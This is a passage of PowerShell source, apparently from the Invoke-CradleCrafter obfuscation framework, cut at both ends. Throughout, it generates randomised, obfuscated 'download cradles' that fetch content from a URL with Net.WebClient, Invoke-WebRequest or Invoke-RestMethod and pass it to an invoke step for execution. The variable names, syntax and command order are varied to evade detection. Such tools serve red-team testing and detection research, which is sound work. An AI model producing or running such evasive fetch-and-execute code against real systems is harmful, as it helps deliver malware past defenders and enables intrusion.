                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Encapsulate OpenRead in single quotes if basic syntax is used.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # Add encapsulating parentheses if non-default variable syntax is used.                      
                    If(!$GetVar3.StartsWith('$'))
                    {
                        $GetVar3WithTags = $GetVar3WithTags.Replace($GetVar3,('(' + $GetVar3 + ')'))
                        $GetVar3 = '(' + $GetVar3 + ')'
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','OpenRead','OpenReadForStream','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        $Response = "$GetVar1.$GetVar3($GetVar2)"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($ResponseTag,$Response)
                        $Stream = $Stream.Replace($SRSetVarTag,$SetVar4)
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar4)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar5)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar3$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$GetVar1.$GetVar3($GetVar2)"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar5
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar5
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Remove single quotes if default 'OpenRead' value is used.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $Array2IndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar5
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray2 += $Stream.Replace($GetVar3,$OpenRead)
                            $SyntaxToInvoke = $GetVar5
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                          
                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 6

                    # Since we may have += syntax if Stream option 6 is chosen, we keep getting randomized GET/SET variable syntax until $GetVar6 is an acceptable syntax.
                    # (Get-Variable VARNAME).Value+= is acceptable, but errors occur when the syntax is (Get-Variable VARNAME -ValueOnly)+=
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                        # Set all new variables from above function to current variable context (from script-level to normal-level).
                        For($k=1; $k -le $NumberOfVarNames; $k++)
                        {
                            ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                        }
                    }
                    Until(!$GetVar6.Contains(' -V'))

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Encapsulate OpenRead in single quotes if basic syntax is used.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','OpenRead','OpenReadForStream','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        # If both $GetVar4 syntax ends in .Value then it must be must be encapsulated in another layer of parentheses.
                        If($GetVar4.ToLower().Contains(').value'))
                        {
                            $Response = "$GetVar1.($GetVar4)($GetVar2)"
                        }
                        Else
                        {
                            $Response = "$GetVar1.$GetVar4($GetVar2)"
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        If($SetVar5.Contains(' '))
                        {
                            # Add extra parenthese for SetVar5 if it is a Set-Variable syntax (i.e. with whitespaces).
                            $Stream = $Stream.Replace($ResponseTag,($Response + ')'))
                            $Stream = $Stream.Replace($SRSetVarTag,($SetVar5 + '('))
                        }
                        Else
                        {
                            $Stream = $Stream.Replace($ResponseTag,$Response)
                            $Stream = $Stream.Replace($SRSetVarTag,$SetVar5)
                        }
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar6)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar6)
                        $Stream = $Stream.Replace($WRSetVarTag,$SetVar1)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar4$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            If($GetVar4.Contains(' '))
                            {
                                $CommandArray += "$SetVar1$GetVar1.($GetVar4)($GetVar2)"
                            }
                            Else
                            {
                                $CommandArray += "$SetVar1$GetVar1.$GetVar4($GetVar2)"
                            }
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Remove single quotes if default 'OpenRead' value is used.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            # If $GetVar4 was encapsulated in parentheses in $Stream for $CommandArray (not $CommandArray2) then we will remove them below for $OpenRead (and not its variable as above).
                            If($Stream.Contains("($GetVar4)"))
                            {
                                $CommandArray2 += $Stream.Replace("($GetVar4)",$OpenRead)
                            }
                            Else
                            {
                                $CommandArray2 += $Stream.Replace($GetVar4,$OpenRead)
                            }

                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {
                                # Handle if only one element is added to $CommandArray thus treating it as a string.
                                If($CommandArray.GetType().Name -eq 'String') {$Syntax = $CommandArray}
                                Else {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            }
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        7 {
            ###################################################
            ## PsWebRequest (Invoke-WebRequest/IWR) - PS3.0+ ##
            ###################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                    If($SwitchRandom_01)
                    {
                        $Response         = "('$Url'|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        $ResponseWithTags = "('$UrlWithTags'|$ForEachRandom{($InvokeWebRequestWithTags $CurrentItemVariable)})"
                    }
                    Else
                    {
                        # Add single quotes to URL only if it contains whitespace.
                        If($Url.Contains(' '))
                        {
                            $Url = "'$Url'"
                            $UrlWithTags = $UrlWithTags.Replace($Url,"'$Url'")
                        }

                        $Response         = "($InvokeWebRequest $Url)"
                        $ResponseWithTags = "($InvokeWebRequestWithTags $UrlWithTags)"
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $SyntaxToInvoke         = $Content2.Replace($ResponseTag,$Response)
                    $SyntaxToInvokeWithTags = $Content2WithTags.Replace($ResponseTag,$ResponseWithTags)

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url' # Url
                    $RandomVarName2 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','Content2','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeWebRequest $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $ResponseVar = "$GetVar2"
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeWebRequest $GetVar1)"
                        }

                        $ResponseVar = $SyntaxToInvoke
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','Content2','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeWebRequest $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $ResponseVar = "$GetVar2"
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeWebRequest $GetVar1)"
                        }

                        $ResponseVar = $SyntaxToInvoke
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        8 {
            ###################################################
            ## PsRestMethod (Invoke-RestMethod/IRM) - PS3.0+ ##
            ###################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                    If($SwitchRandom_01)
                    {
                        $Response         = "('$Url'|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        $ResponseWithTags = "('$UrlWithTags'|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                    }
                    Else
                    {
                        # Add single quotes to URL only if it contains whitespace.
                        If($Url.Contains(' '))
                        {
                            $Url = "'$Url'"
                            $UrlWithTags = $UrlWithTags.Replace($Url,"'$Url'")
                        }

                        $Response         = "($InvokeRestMethod $Url)"
                        $ResponseWithTags = "($InvokeRestMethod $UrlWithTags)"
                    }

                    $SyntaxToInvoke         = $Response
                    $SyntaxToInvokeWithTags = $ResponseWithTags

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url' # Url
                    $RandomVarName2 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeRestMethod $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $SyntaxToInvoke = "$GetVar2"
                          
